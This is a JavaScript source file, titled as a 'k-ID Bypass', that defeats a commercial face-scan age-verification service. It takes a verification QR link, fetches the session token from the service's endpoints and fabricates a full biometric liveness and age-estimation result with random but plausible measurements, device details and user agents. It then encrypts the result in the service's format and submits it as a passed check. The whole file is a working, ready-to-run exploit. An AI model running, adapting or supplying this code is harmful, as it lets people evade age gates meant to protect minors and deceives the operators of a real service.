// ═══════════════════════════════════════════════════════
// k-ID Bypass — Standalone Full Implementation
// No external API dependency - runs 100% in browser
// Based on: kibty.town standalone-verify.ts
// ═══════════════════════════════════════════════════════

var KIDBypassStandalone = (function(){
  'use strict';

  var BASE_URL = 'https://eu-west-1.faceassure.com';

  // ─── Helper Functions ───
  function randomInt(min, max){
    return Math.floor(Math.random() * (max - min + 1)) + min;
  }

  function randomFloat(min, max, decimals){
    decimals = decimals || 15;
    return parseFloat((Math.random() * (max - min) + min).toFixed(decimals));
  }

  function randomChoice(arr){
    return arr[Math.floor(Math.random() * arr.length)];
  }

  function generateId(id, sub, sessionId, delimiter){
    delimiter = delimiter || '|';
    var s = 0;
    var a = '' + id + delimiter + sub + delimiter + sessionId;
    for(var i = 0; i < a.length; i++){
      s = (s << 5) - s + a.charCodeAt(i);
      s &= s;
    }
    return '' + s;
  }

  function generateUserAgent(){
    var agents = [
      'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
      'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1',
      'Mozilla/5.0 (Android 13; Mobile; rv:109.0) Gecko/109.0 Firefox/117.0',
      'Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.36'
    ];
    return agents[Math.floor(Math.random() * agents.length)];
  }

  function parseUserAgent(userAgent){
    var isIOS = /iPhone|iPad/.test(userAgent);
    var isAndroid = /Android/.test(userAgent);
    var isSafari = /Safari/.test(userAgent) && !/Chrome/.test(userAgent);
    var isChrome = /Chrome/.test(userAgent);
    var isFirefox = /Firefox/.test(userAgent);

    return {
      browser: {
        name: isSafari ? 'Safari' : isChrome ? 'Chrome' : isFirefox ? 'Firefox' : 'Safari',
        version: isIOS ? '17.0' : '117.0'
      },
      device: {
        type: 'mobile',
        vendor: isIOS ? 'Apple' : 'Samsung',
        model: isIOS ? 'iPhone' : 'Galaxy'
      },
      os: {
        name: isIOS ? 'iOS' : isAndroid ? 'Android' : 'iOS',
        version: isIOS ? '17.0' : '13'
      },
      engine: { name: isSafari || isIOS ? 'WebKit' : 'Blink' },
      cpu: { architecture: '64' }
    };
  }

  function getRandomLocation(){
    var locations = [
      {country: 'United States', state: 'California', timezone: 'America/Los_Angeles', lang: 'en-US,en;q=0.9'},
      {country: 'United States', state: 'New York', timezone: 'America/New_York', lang: 'en-US,en;q=0.9'},
      {country: 'Canada', state: 'Ontario', timezone: 'America/Toronto', lang: 'en-CA,en;q=0.9,fr;q=0.8'},
      {country: 'Australia', state: 'New South Wales', timezone: 'Australia/Sydney', lang: 'en-AU,en;q=0.9'},
      {country: 'Germany', state: 'Berlin', timezone: 'Europe/Berlin', lang: 'de-DE,de;q=0.9,en;q=0.8'}
    ];
    return locations[Math.floor(Math.random() * locations.length)];
  }

  function generateMediaMetadata(sub, sessionId){
    var randomHex = function(){
      return Array.from({length: 32}, function(){
        return Math.floor(Math.random() * 16).toString(16).toUpperCase();
      }).join('');
    };

    var specs = [
      {width: 4032, height: 3024, frameRate: 60, zoom: 10, aspectRatio: 4032 / 3024},
      {width: 3840, height: 2160, frameRate: 60, zoom: 8, aspectRatio: 3840 / 2160},
      {width: 1920, height: 1080, frameRate: 120, zoom: 5, aspectRatio: 1920 / 1080},
      {width: 2560, height: 1440, frameRate: 60, zoom: 6, aspectRatio: 2560 / 1440}
    ];

    var spec = randomChoice(specs);
    var deviceId = generateId(randomHex(), sub, sessionId, '-');

    return [
      {
        mediaKind: 'audioinput',
        mediaLabel: randomChoice(['', 'Built-in Microphone', 'Default']),
        mediaId: randomHex(),
        mediaCapabilities: {}
      },
      {
        mediaKind: 'videoinput',
        mediaLabel: 'Front Camera',
        mediaId: deviceId,
        mediaCapabilities: {
          aspectRatio: {max: spec.aspectRatio, min: randomFloat(0.0003, 0.001, 15)},
          backgroundBlur: [false],
          deviceId: deviceId,
          facingMode: ['user'],
          focusDistance: {min: randomFloat(0.1, 0.3)},
          frameRate: {max: spec.frameRate, min: 1},
          groupId: randomHex(),
          height: {max: spec.height, min: 1},
          powerEfficient: [false, true],
          whiteBalanceMode: randomChoice([
            ['manual', 'continuous'],
            ['auto', 'manual'],
            ['continuous']
          ]),
          width: {max: spec.width, min: 1},
          zoom: {max: spec.zoom, min: 1}
        }
      }
    ];
  }

  var AMAP_MAP = {
    0: [0, 2], 1: [2, 4], 2: [4, 8], 3: [8, 13], 4: [13, 18], 5: [18, 21],
    6: [21, 25], 7: [25, 28], 8: [28, 32], 9: [32, 36], 10: [36, 40],
    11: [40, 45], 12: [45, 50], 13: [50, 60], 14: [60, 70], 15: [70, 120]
  };

  function amap(e){
    var n = AMAP_MAP[~~e];
    var r = e % 1;
    return n[0] + r * (n[1] - n[0]);
  }

  function removeOutliersWithZscore(arr){
    var r = arr.reduce(function(e, t){return e + t}, 0) / arr.length;
    var a = arr.reduce(function(e, t){return e + Math.pow(t - r, 2)}, 0) / arr.length;
    var s = Math.sqrt(a);
    return arr.filter(function(e){return Math.abs((e - r) / s) <= 1});
  }

  function calculateSpeedAndIntervals(measurements, timestamps){
    var intervals = [];
    var speeds = [];
    for(var i = 1; i < measurements.length; i++){
      var distance = Math.abs(measurements[i] - measurements[i - 1]);
      var timeInterval = (timestamps[i] - timestamps[i - 1]) / 1000;
      intervals.push(timeInterval);
      speeds.push(timeInterval > 0 ? distance / timeInterval : 0);
    }
    return {intervals: intervals, speeds: speeds};
  }

  async function encryptPayload(nonce, payload){
    var getKey = async function(nonce, timestamp, transactionId){
      var data = nonce + timestamp + transactionId;
      var dataEncoded = new TextEncoder().encode(data);
      var key = await crypto.subtle.importKey('raw', dataEncoded, {name: 'HKDF'}, false, ['deriveBits']);
      var derived = await crypto.subtle.deriveBits(
        {name: 'HKDF', hash: 'SHA-256', salt: new Uint8Array(0), info: new TextEncoder().encode('payload-encryption')},
        key, 32 * 8
      );
      return await crypto.subtle.importKey('raw', derived, {name: 'AES-GCM'}, false, ['encrypt']);
    };

    var timestamp = new Date().toISOString();
    var key = await getKey(nonce, timestamp, payload.transaction_id);
    var iv = crypto.getRandomValues(new Uint8Array(12));
    var encryptedBuffer = await crypto.subtle.encrypt(
      {name: 'AES-GCM', iv: iv},
      key,
      new TextEncoder().encode(JSON.stringify(payload))
    );

    var rawBuffer = new Uint8Array(encryptedBuffer);
    var encryptedPayloadBuf = rawBuffer.subarray(0, rawBuffer.length - 16);
    var authTagBuf = rawBuffer.subarray(rawBuffer.length - 16);

    return {
      encrypted_payload: btoa(String.fromCharCode.apply(null, encryptedPayloadBuf)),
      iv: btoa(String.fromCharCode.apply(null, iv)),
      auth_tag: btoa(String.fromCharCode.apply(null, authTagBuf)),
      timestamp: timestamp
    };
  }

  function generateBoundingBox(){
    var topLeft = [randomFloat(140, 160), randomFloat(250, 270)];
    var width = randomFloat(170, 190);
    var height = randomFloat(220, 240);
    return {
      topLeft: topLeft,
      bottomRight: [topLeft[0] + width, topLeft[1] + height],
      width: width,
      height: height
    };
  }

  function generateTimeline(maxTime){
    var entries = [];
    var lastTime = randomInt(1000, 3000);
    for(var i = 0; i < randomInt(1, 3); i++){
      var end = lastTime + randomInt(300, 1500);
      if(end < maxTime){
        entries.push([lastTime, end]);
        lastTime = end + randomInt(1000, 3000);
      }
    }
    return entries;
  }

  function generateStateTimelines(completionTime){
    var states = ['TIME_UNTIL_CLICK_START', 'GET_READY', 'NO_FACE', 'LOOK_STRAIGHT', 'TURN_LEFT', 'CENTRE_FACE', 'KEEP_YOUR_MOUTH_OPEN', 'CLOSE_YOUR_MOUTH', 'SLOWLY_COME_CLOSER_TO_THE_CAMERA', 'SLOWLY_DISTANCE_YOURSELF_FROM_THE_CAMERA', 'TOO_DARK'];
    var noState = ['VIDEO_PROCESSING', 'STAY_STILL', 'TURN_RIGHT', 'ALIGN_YOUR_FACE_WITH_THE_CAMERA_UP', 'ALIGN_YOUR_FACE_WITH_THE_CAMERA_DOWN', 'SLIGHTLY_TILT_YOUR_HEAD_LEFT', 'SLIGHTLY_TILT_YOUR_HEAD_RIGHT', 'OPEN_YOUR_MOUTH'];
    var timelines = {};
    states.forEach(function(state){timelines[state] = generateTimeline(completionTime)});
    noState.forEach(function(state){timelines[state] = []});
    return timelines;
  }

  // ─── Main Verification Function ───
  async function verify(qrCodeUrlStr, onProgress){
    onProgress = onProgress || function(){};
    
    var userAgent = generateUserAgent();
    var parsedUserAgent = parseUserAgent(userAgent);
    var location = getRandomLocation();

    var commonHeaders = {
      'User-Agent': userAgent,
      'accept': '*/*',
      'accept-language': location.lang,
      'access-control-allow-origin': '*',
      'sec-fetch-dest': 'empty',
      'sec-fetch-mode': 'cors',
      'sec-fetch-site': 'cross-site'
    };

    onProgress('Parsing QR code...');
    var qrCodeUrl = new URL(qrCodeUrlStr);
    var shortlinkId = qrCodeUrl.searchParams.get('sl');
    if(!shortlinkId) throw new Error('Shortlink ID not found in QR code URL');

    onProgress('Fetching shortlink...');
    var res = await fetch(BASE_URL + '/shortlinks/' + shortlinkId, {headers: commonHeaders});
    if(!res.ok) throw new Error('Failed to get shortlink (status=' + res.status + ')');

    var data = await res.json();
    var originalUrl = new URL(data.Item.original_url.S.replace('#', ''));
    var token = originalUrl.searchParams.get('token');
    if(!token) throw new Error('Token not found in original URL');

    var parts = token.split('.');
    if(parts.length !== 3) throw new Error('Token is an invalid JWT');
    var jwtPayload = JSON.parse(atob(parts[1].replace(/-/g, '+').replace(/_/g, '/')));

    onProgress('Generating session...');
    var sessionRes = await fetch(BASE_URL + '/age-services/d-privately-age-services', {
      method: 'POST',
      headers: Object.assign({'Content-Type': 'application/json'}, commonHeaders),
      body: JSON.stringify({
        request_type: 'generate_new_session',
        transaction_id: jwtPayload.jti,
        api_key: null,
        api_secret: null,
        token: token,
        longURL: null,
        userAgent: userAgent
      })
    });

    if(!sessionRes.ok) throw new Error('Failed to generate session (status=' + sessionRes.status + ')');
    var sessionData = await sessionRes.json();

    onProgress('Building payload...');
    var baseAge = randomFloat(25.2, 26.0);
    var minAge = baseAge - randomFloat(0.1, 0.5);
    var maxAge = baseAge + randomFloat(0.1, 0.5);
    var averageAge = (minAge + maxAge) / 2;
    var currentTime = Date.now() / 1000;
    var initialAdjustmentTime = randomInt(200, 800);
    var completionTime = randomInt(8000, 15000);

    var raws = Array.from({length: 10}, function(){return randomFloat(6.005, 7.007)});
    var primaryOutputs = removeOutliersWithZscore(raws.map(function(r){return amap(r)}));
    var outputs = removeOutliersWithZscore(primaryOutputs);

    var gestureMeasurementTime = Date.now();
    var recordedMeasurements = Array.from({length: 5}, function(){return randomFloat(0.1, 0.8, 17)});
    var recordedTimestamps = [
      randomInt(500, Math.min(completionTime, 1000)) - gestureMeasurementTime,
      randomInt(700, Math.min(completionTime, 1000)) - gestureMeasurementTime,
      randomInt(1000, Math.min(completionTime, 1400)) - gestureMeasurementTime,
      randomInt(1400, Math.min(completionTime, 1600)) - gestureMeasurementTime,
      randomInt(1600, Math.min(completionTime, 1800)) - gestureMeasurementTime
    ];
    var recordedData = calculateSpeedAndIntervals(recordedMeasurements, recordedTimestamps);

    var failedMeasurements = Array.from({length: 5}, function(){return randomFloat(0.1, 0.8, 17)});
    var failedTimestamps = [
      randomInt(500, Math.min(completionTime, 1000)) - gestureMeasurementTime,
      randomInt(700, Math.min(completionTime, 1000)) - gestureMeasurementTime,
      randomInt(1000, Math.min(completionTime, 1400)) - gestureMeasurementTime,
      randomInt(1400, Math.min(completionTime, 1600)) - gestureMeasurementTime
    ];
    var failedData = calculateSpeedAndIntervals(failedMeasurements, failedTimestamps);

    var stateTimelines = generateStateTimelines(completionTime);
    var stateCompletionTimes = {};
    for(var key in stateTimelines){
      if(stateTimelines[key].length < 1) continue;
      var totalDuration = 0;
      for(var i = 0; i < stateTimelines[key].length; i++){
        totalDuration += stateTimelines[key][i][1] - stateTimelines[key][i][0];
      }
      stateCompletionTimes[key] = totalDuration;
    }

    var mediaMetadata = generateMediaMetadata(jwtPayload.sub, sessionData.session_id);
    var ageCheckSession = generateId(
      mediaMetadata.find(function(m){return m.mediaKind === 'videoinput'}).mediaId,
      jwtPayload.sub,
      sessionData.session_id
    );

    var laplacianBlurScores = Array.from({length: 300}, function(){return randomFloat(10, 300, 15)});

    var payload = {
      request_type: 'complete_transaction',
      transaction_id: sessionData.transaction_id,
      api_key: sessionData.session_id,
      api_secret: sessionData.session_password,
      remote_pld: {},
      browser_response_data: {
        age: 'yes',
        age_confidence: 1,
        genuineness: Array.from({length: 5}, function(){return randomFloat(0.4, 0.98)}),
        product: 'age',
        modality: 'image',
        unverifiedPayload: {
          iss: 'https://api.privately.swiss',
          sub: jwtPayload.sub,
          aud: 'https://api.k-id.com',
          exp: jwtPayload.exp,
          nbf: jwtPayload.nbf,
          iat: jwtPayload.iat,
          jti: jwtPayload.jti,
          age: jwtPayload.age,
          liv: true,
          rlt: {minAge: minAge, maxAge: maxAge, score: 0, gate: 16},
          rsn: 'complete_transaction',
          rtf: 'interval',
          rtb: 'callback',
          vid: jwtPayload.vid,
          ver: 'v1.10.22',
          ufi: []
        },
        ageCheckSession: ageCheckSession,
        miscellaneous: {
          recordedOpennessStreak: recordedMeasurements,
          recordedSpeeds: recordedData.speeds,
          recordedIntervals: recordedData.intervals,
          failedOpennessReadings: [failedMeasurements],
          failedOpennessSpeeds: [failedData.speeds],
          failedOpennessIntervals: [failedData.intervals],
          numberOfGestureRetries: 1,
          antiSpoofConfidences: [],
          fp_scores: [],
          laplacian_blur_scores: laplacianBlurScores,
          laplacian_min_score: Math.min.apply(null, laplacianBlurScores),
          laplacian_max_score: Math.max.apply(null, laplacianBlurScores),
          laplacian_avg_score: laplacianBlurScores.reduce(function(a,b){return a+b},0) / laplacianBlurScores.length,
          glare_ratios: Array.from({length: 300}, function(){return 0}),
          allScreenDetectionDetails: {
            beforeClickingStart: {screenDetectionConfidence: [], screenFaceOverlap: [], screenBoundingBoxes: [], alternativeScore: []},
            positioning: {screenDetectionConfidence: Array.from({length: 2}, function(){return randomFloat(0.01, 0.03)}), screenFaceOverlap: [0, 0], screenBoundingBoxes: [[], []], alternativeScore: Array.from({length: 2}, function(){return randomFloat(0.2, 0.9)})},
            liveness: {screenDetectionConfidence: Array.from({length: 2}, function(){return randomFloat(0.01, 0.03)}), screenFaceOverlap: [0, 0], screenBoundingBoxes: [[], []], alternativeScore: Array.from({length: 2}, function(){return randomFloat(0.2, 0.9)})},
            distancing: {screenDetectionConfidence: Array.from({length: 2}, function(){return randomFloat(0.01, 0.03)}), screenFaceOverlap: [0, 0], screenBoundingBoxes: [Array.from({length: 2}, generateBoundingBox)], alternativeScore: Array.from({length: 2}, function(){return randomFloat(0.2, 0.9)})},
            closing: {screenDetectionConfidence: Array.from({length: 2}, function(){return randomFloat(0.01, 0.03)}), screenFaceOverlap: [0, 0], screenBoundingBoxes: [Array.from({length: 2}, generateBoundingBox)], alternativeScore: Array.from({length: 2}, function(){return randomFloat(0.2, 0.9)})},
            postChallenge: {screenDetectionConfidence: Array.from({length: 2}, function(){return randomFloat(0.01, 0.03)}), screenFaceOverlap: [0, 0], screenBoundingBoxes: [[], []], alternativeScore: Array.from({length: 2}, function(){return randomFloat(0.2, 0.9)})}
          },
          plScores: [],
          screenDetectionExecutionTimes: {
            beforeClickingStart: [],
            positioning: Array.from({length: 2}, function(){return randomFloat(5000, 6000)}),
            liveness: Array.from({length: 2}, function(){return randomFloat(4000, 5000)}),
            distancing: Array.from({length: 2}, function(){return randomFloat(3000, 4000)}),
            closing: Array.from({length: 2}, function(){return randomFloat(2000, 3000)}),
            postChallenge: Array.from({length: 2}, function(){return randomFloat(500, 1500)})
          },
          landmarkDetectionExecutionTimes: {
            beforeClickingStart: [],
            positioning: Array.from({length: 200}, function(){return randomFloat(50, 150)}),
            liveness: Array.from({length: 50}, function(){return randomFloat(50, 110)}),
            distancing: Array.from({length: 5}, function(){return randomFloat(50, 110)}),
            closing: Array.from({length: 20}, function(){return randomFloat(50, 110)}),
            postChallenge: Array.from({length: 7}, function(){return randomFloat(50, 110)})
          },
          screenAttackMeasure: 0,
          screenAttackBoundingBox: {},
          subclient: jwtPayload.sub,
          verificationID: jwtPayload.vid,
          version: 'v1.10.22',
          sdk_path: './face-capture-v1.10.22.js',
          model_version: 'v.2025.0',
          cropper_version: 'v.0.0.3',
          start_time_stamp: currentTime - (completionTime + initialAdjustmentTime + randomInt(2000, 5000)) / 1000,
          end_time_stamp: currentTime + randomFloat(0.1, 0.5),
          device_timezone: location.timezone,
          referring_page: 'https://d3ogqhtsivkon3.cloudfront.net/index-v1.10.22.html#/?token=' + token + '&shi=false&from_qr_scan=true',
          parent_page: 'https://d3ogqhtsivkon3.cloudfront.net/dynamic_index.html?sl=' + jwtPayload.jti + '&region=eu-central-1',
          face_confidence_limit: 0.975,
          multipleFacesDetected: false,
          targetGate: 18,
          targetConfidence: 0.9,
          averageAge: averageAge,
          selecedLivenessStyle: 'open',
          selectedMediaLabel: 'Front Camera',
          rawImageWidth: 480,
          rawImageHeight: 640,
          boundingBoxesInPixels: Array.from({length: randomInt(5, 10)}, generateBoundingBox),
          latestReportedState: 'AGE_CHECK_COMPLETE',
          challengeType: 'distance-open',
          authenticationCharacteristics: {
            session_id: sessionData.session_id,
            session_password: sessionData.session_password,
            token: token
          },
          deviceCharacteristics: {
            deviceBrowserModel: userAgent,
            isMobile: parsedUserAgent.device.type === 'mobile',
            browserName: parsedUserAgent.browser.name.toLowerCase(),
            isDeviceBrowserCompatible: true,
            deviceConnectionSpeedKbps: randomFloat(20000, 500000),
            deviceRegion: {country: location.country, state: location.state},
            mediaMetadata: mediaMetadata,
            platformDetails: {
              name: parsedUserAgent.browser.name,
              version: parsedUserAgent.browser.version,
              layout: parsedUserAgent.engine.name,
              os: {
                architecture: parseInt(parsedUserAgent.cpu.architecture) || 64,
                family: parsedUserAgent.os.name,
                version: parsedUserAgent.os.version
              },
              description: parsedUserAgent.browser.name + ' ' + parsedUserAgent.browser.version + ' on ' + parsedUserAgent.device.vendor + ' ' + parsedUserAgent.device.model,
              product: parsedUserAgent.device.model,
              manufacturer: parsedUserAgent.device.vendor
            },
            userTriedLandscapeMode: 0,
            txFinishedInLandscapeMode: false
          },
          initializationCharacteristics: {
            cropperInitTime: randomInt(150, 250),
            coreInitTime: randomInt(800, 1000),
            pageLoadTime: randomInt(250, 350) + Number(Math.random().toFixed(randomInt(7, 13))),
            from_qr_scan: true,
            blendShapesAvailable: true
          },
          executionCharacteristics: {
            experimentSetup: {
              experimentType: 'passive-liveness-override',
              experimentProbability: 1,
              deviceCoverage: 'all',
              deviceInfo: {
                name: parsedUserAgent.browser.name,
                version: parsedUserAgent.browser.version,
                layout: parsedUserAgent.engine.name,
                os: {
                  architecture: parseInt(parsedUserAgent.cpu.architecture) || 64,
                  family: parsedUserAgent.os.name,
                  version: parsedUserAgent.os.version
                },
                description: parsedUserAgent.browser.name + ' ' + parsedUserAgent.browser.version + ' on ' + parsedUserAgent.device.vendor + ' ' + parsedUserAgent.device.model,
                product: parsedUserAgent.device.model,
                manufacturer: parsedUserAgent.device.vendor
              },
              txMode: 'experiment',
              timestamp: Date.now() - completionTime - initialAdjustmentTime - randomInt(2000, 5000)
            },
            experimentConfigResult: {
              success: true,
              txMode: 'experiment',
              experimentType: 'passive-liveness-override'
            },
            isCameraPermissionGranted: true,
            completionTime: completionTime,
            deferredComputationStartedAt: currentTime - randomFloat(0.5, 2.0),
            instructionCompletionTime: completionTime + initialAdjustmentTime + randomInt(50, 200),
            initialAdjustmentTime: initialAdjustmentTime,
            completionState: 'COMPLETE',
            unfinishedInstructions: {
              NO_FACE: false, VIDEO_PROCESSING: false, STAY_STILL: false, LOOK_STRAIGHT: false,
              GET_READY: false, TURN_LEFT: false, TURN_RIGHT: false, ALIGN_YOUR_FACE_WITH_THE_CAMERA_UP: false,
              ALIGN_YOUR_FACE_WITH_THE_CAMERA_DOWN: false, SLIGHTLY_TILT_YOUR_HEAD_LEFT: false,
              SLIGHTLY_TILT_YOUR_HEAD_RIGHT: false, CENTRE_FACE: false, OPEN_YOUR_MOUTH: false,
              KEEP_YOUR_MOUTH_OPEN: false, CLOSE_YOUR_MOUTH: false, SLOWLY_COME_CLOSER_TO_THE_CAMERA: false,
              SLOWLY_DISTANCE_YOURSELF_FROM_THE_CAMERA: false, TOO_DARK: false
            },
            stateCompletionTimes: stateCompletionTimes,
            stateTimelines: stateTimelines,
            nonNeutralExpressionTimelines: {
              browDownLeft: {}, browDownRight: {}, mouthSmileLeft: {}, mouthSmileRight: {},
              mouthPucker: {}, mouthDimpleLeft: {}, mouthDimpleRight: {}, mouthPressLeft: {},
              mouthPressRight: {}, mouthShrugLower: {}, mouthShrugUpper: {}, eyeBlinkLeft: {},
              eyeBlinkRight: {}, mouthFrownLeft: {}, mouthFrownRight: {}
            },
            handAnalysis: {faceHandSizeComparisons: []},
            predictions: {
              outputs: outputs,
              primaryOutputs: primaryOutputs,
              raws: raws,
              secondaryOutputs: [],
              secondaryRaws: [],
              age: 'yes',
              horizontal_estimates: Array.from({length: 6}, function(){return randomFloat(3.1, 3.2)}),
              vertical_estimates: Array.from({length: 6}, function(){return randomFloat(-1.6, -1.5)}),
              horizontalratiotocenter_estimates: Array.from({length: 6}, function(){return randomFloat(1.01, 1.03)}),
              zy_estimates: Array.from({length: 6}, function(){return randomFloat(0.42, 0.44)}),
              driftfromcenterx_estimates: Array.from({length: 6}, function(){return randomFloat(0.005, 0.007)}),
              driftfromcentery_estimates: Array.from({length: 6}, function(){return randomFloat(-0.35, -0.37)}),
              xScaledShiftAmt: 11.5,
              yScaledShiftAmt: -2
            }
          },
          errorCharacteristics: {
            systemErrors: [],
            userErrors: {}
          }
        }
      }
    };

    onProgress('Encrypting payload...');
    var encryptionData = await encryptPayload(sessionData.nonce, payload);
    payload = Object.assign(payload, encryptionData);

    onProgress('Submitting verification...');
    var completeRes = await fetch(BASE_URL + '/age-services/d-privately-age-services', {
      method: 'POST',
      headers: Object.assign({'Content-Type': 'application/json'}, commonHeaders),
      body: JSON.stringify(payload)
    });

    if(!completeRes.ok){
      var errorText = await completeRes.text();
      throw new Error('Failed to complete transaction (status=' + completeRes.status + ', body=' + errorText + ')');
    }

    onProgress('Verification complete!');
    return {success: true, transaction_id: payload.transaction_id};
  }

  // ─── Public API ───
  return {
    verify: verify
  };
})();
